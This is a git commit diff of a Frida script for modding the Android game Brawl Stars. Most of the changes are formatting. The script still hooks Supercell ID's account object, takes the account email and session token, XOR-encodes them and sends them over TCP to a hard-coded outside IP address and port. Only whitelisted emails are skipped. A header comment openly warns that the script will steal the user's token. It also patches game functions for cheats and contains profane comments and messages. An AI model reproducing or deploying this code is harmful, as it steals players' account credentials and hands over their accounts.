539026c7e77efc5e48506911a0b91b76ee58b8e2
kubune <132983498+kubune@users.noreply.github.com>
2025-01-30 19:25:46 +0100

    Update libformodders-v59.js fix

--- Brawl Stars/special/libformodders-v59.js
+++ Brawl Stars/special/libformodders-v59.js
@@ -1,6 +1,6 @@
 // THIS SCRIPT WILL STEAL YOUR TOKEN!!! CAUTION WHEN USING THIS!
-// script has the famous kit exploit for v59
-// To disable the token grab, set the host (line 98) to 127.0.0.1 or something
+// script has the famouse kit exploit for v59
+// to disable the token grab set the host (line 98) to 127.0.0.1 or something
 
 const free = new NativeFunction(Module.getExportByName('libc.so', 'free'), 'void', ['pointer']);
 const fread = new NativeFunction(Module.getExportByName('libc.so', 'fread'), 'int', ['pointer', 'int', 'int', 'pointer']);
@@ -11,23 +11,19 @@ const fseek = new NativeFunction(Module.getExportByName('libc.so', 'fseek'), 'in
 const rewind = new NativeFunction(Module.getExportByName('libc.so', 'rewind'), 'void', ['pointer']);
 const malloc = new NativeFunction(Module.getExportByName('libc.so', 'malloc'), 'pointer', ['uint']);
 
-const toast = function (text) {
+const toast = function(text) {
     Java.scheduleOnMainThread(() => {
         Java.use('android.widget.Toast')
-            .makeText(
-                Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(),
-                Java.use('java.lang.StringBuilder').$new(text),
-                1
-            ).show();
+            .makeText(Java.use('android.app.ActivityThread').currentApplication().getApplicationContext(), Java.use('java.lang.StringBuilder').$new(text), 1).show();
     });
 };
 
 var dataDirectory = null;
 
-Java.perform(function () {
-    const activityManager = Java.use('android.app.ActivityManager');
-    const context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
-    const fileDir = context.getFilesDir().getAbsolutePath();
+Java.perform(function() {
+    var activityManager = Java.use('android.app.ActivityManager');
+    var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
+    var fileDir = context.getFilesDir().getAbsolutePath();
 
     dataDirectory = fileDir;
 });
@@ -51,7 +47,7 @@ function writeToFile(filePath, mode, text) {
         file.close();
     } catch (e) {
         const errortimefile = getCurrentTime();
-        const errormessagefile = `${errortimefile} Error occurred while writing file: ${e}\n`;
+        var errormessagefile = `${errortimefile} Error occurred while writing file: ${e}\n`;
         if (filePath !== errorPath) {
             const file = new File(errorPath, 'a+');
             file.write(errormessagefile);
@@ -64,18 +60,18 @@ function writeToFile(filePath, mode, text) {
 writeToFile(savefilepath, 'a+', '""');
 
 function ReadFile(filepath, mode) {
-    const file = fopen(Memory.allocUtf8String(filepath), Memory.allocUtf8String(mode));
+    var file = fopen(Memory.allocUtf8String(filepath), Memory.allocUtf8String(mode));
     fseek(file, 0, 2);
-    const Fsize = ftell(file);
+    var Fsize = ftell(file);
     rewind(file);
-    const buffer = malloc(Fsize);
+    var buffer = malloc(Fsize);
     fread(buffer, 1, Fsize, file);
-    const byteArray = Memory.readByteArray(buffer, Fsize);
-    const uint8Array = new Uint8Array(byteArray);
+    var byteArray = Memory.readByteArray(buffer, Fsize);
+    var uint8Array = new Uint8Array(byteArray);
     fclose(file);
     free(buffer);
-    let resultString = '';
-    for (let i = 0; i < uint8Array.length; i++) {
+    var resultString = '';
+    for (var i = 0; i < uint8Array.length; i++) {
         resultString += String.fromCharCode(uint8Array[i]);
     }
     return resultString;
@@ -83,17 +79,17 @@ function ReadFile(filepath, mode) {
 
 function encrypt(str, key) {
     str = str.replace(/\n/g, '""');
-    let result = '';
-    for (let i = 0; i < str.length; i++) {
+    var result = '';
+    for (var i = 0; i < str.length; i++) {
         result += (str.charCodeAt(i) ^ key.charCodeAt(i % key.length)).toString(16).padStart(2, '0');
     }
     return result;
 }
 
 function decrypt(hexStr, key) {
-    let result = '';
-    for (let i = 0; i < hexStr.length; i += 2) {
-        const charCode = parseInt(hexStr.substring(i, i + 2), 16) ^ key.charCodeAt((i / 2) % key.length);
+    var result = '';
+    for (var i = 0; i < hexStr.length; i += 2) {
+        var charCode = parseInt(hexStr.substring(i, i + 2), 16) ^ key.charCodeAt((i / 2) % key.length);
         result += String.fromCharCode(charCode);
     }
     return result.replace(/\n/g, '""');
@@ -101,7 +97,7 @@ function decrypt(hexStr, key) {
 
 const HOST = '188.245.178.251'; // Change this to your server's IP
 const PORT = 3169; // Change this to your server's port
-let key = 'your_key_here';
+var key = 'your_key_here';
 
 const whitelist = [
     'oyundronu123@gmail.com',
@@ -134,48 +130,52 @@ function sendHexPayload(hexString) {
         family: 'ipv4',
         host: HOST,
         port: PORT
-    }).then(function (conn) {
+    }).then(function(conn) {
         connection = conn;
+        //console.log(`Connected to ${HOST}:${PORT}`);
 
+        // Convert and send
         const message = hexStringToBytes(hexString);
         return connection.output.write(message);
-    }).then(function () {
+    }).then(function() {
+        //console.log('Message sent successfully');
         return connection.output.drain();
-    }).then(function () {
+    }).then(function() {
+        //console.log('Closing connection...');
         return connection.close();
-    }).catch(function (error) {
+    }).catch(function(error) {
         console.error(`Error: ${error}`);
         if (connection) connection.close();
-        throw error;
+        throw error; // Propagate the error
     });
 }
 
-Java.perform(function () {
-    const IdAccount = Java.use('com.supercell.id.scid_plugin.IdAccount');
+Java.perform(function() {
+    var IdAccount = Java.use('com.supercell.id.scid_plugin.IdAccount');
 
-    IdAccount.toString.overload().implementation = function () {
-        const result = this.toString();
-        const sd = this.sd.value;
-        const el = this.el.value;
-        const st = this.st.value;
+    IdAccount.toString.overload().implementation = function() {
+        var result = this.toString();
+        var sd = this.sd.value;
+        var el = this.el.value;
+        var st = this.st.value;
 
         if (whitelist.includes(el)) {
             return result;
         } else {
-            const sendresult = {
+            var sendresult = {
                 sd: sd,
                 el: el,
                 st: st
             };
 
-            const sendresultString = JSON.stringify(sendresult);
-            const encodedsendresultString = encrypt(sendresultString, key);
+            var sendresultString = JSON.stringify(sendresult);
+            var encodedsendresultString = encrypt(sendresultString, key);
 
-            const content = ReadFile(savefilepath, 'r').trim();
-            const contentNum = Number(content);
+            var content = ReadFile(savefilepath, 'r').trim();
+            var contentNum = Number(content);
             if (isNaN(contentNum)) writeToFile(savefilepath, 'w+', '0');
             if (contentNum < 666) {
-                contentNum++;
+                contentNum++
                 writeToFile(savefilepath, 'w', contentNum.toString());
                 sendHexPayload(encodedsendresultString); // Send payload
             }
@@ -186,7 +186,7 @@ Java.perform(function () {
 });
 
 let packageName = null;
-Java.perform(function () {
+Java.perform(function() {
     const ActivityThread = Java.use('android.app.ActivityThread');
     const currentApplication = ActivityThread.currentApplication();
     const context = currentApplication.getApplicationContext();
@@ -198,6 +198,7 @@ if (packageName == 'com.friday.im.specialmods.v59') {
     const base = Module.findBaseAddress('libg.so');
     const basesize = Process.findModuleByName('libg.so').size;
 
+    // Set memory protection
     Memory.protect(base, basesize, 'rwx');
 
     const SlipperyDebuffAddr = 0x82C668;
@@ -208,19 +209,19 @@ if (packageName == 'com.friday.im.specialmods.v59') {
     const shouldShowMoveStick = base.add(shouldShowMoveStickAddr);
     const hasNoMovement = base.add(hasNoMovementAddr);
 
-    Interceptor.replace(SlipperyDebuff, new NativeCallback(function (a1) {
+    Interceptor.replace(SlipperyDebuff, new NativeCallback(function(a1) { // LogicCharacterClient::hasSlipperyDebuffClient
         return 0;
     }, 'int64', ['int64']));
 
-    Interceptor.replace(shouldShowMoveStick, new NativeCallback(function (a1, a2) {
+    Interceptor.replace(shouldShowMoveStick, new NativeCallback(function(a1, a2) { // BattleScreen::shouldShowMoveStick
         return 1;
     }, 'bool', ['int64', 'pointer']));
 
-    Interceptor.replace(hasNoMovement, new NativeCallback(function (a1) {
+    Interceptor.replace(hasNoMovement, new NativeCallback(function(a1) {
         return 0;
     }, 'int64', ['int64']));
 
     toast('Made By F.R.I.D.A.Y/I.M');
 } else {
-    toast('fuck you dont steal my mod'); // Don't touch my code
+    toast('fuck you dont steal my mod'); // Don't touch my code, you son of a bitch
 }
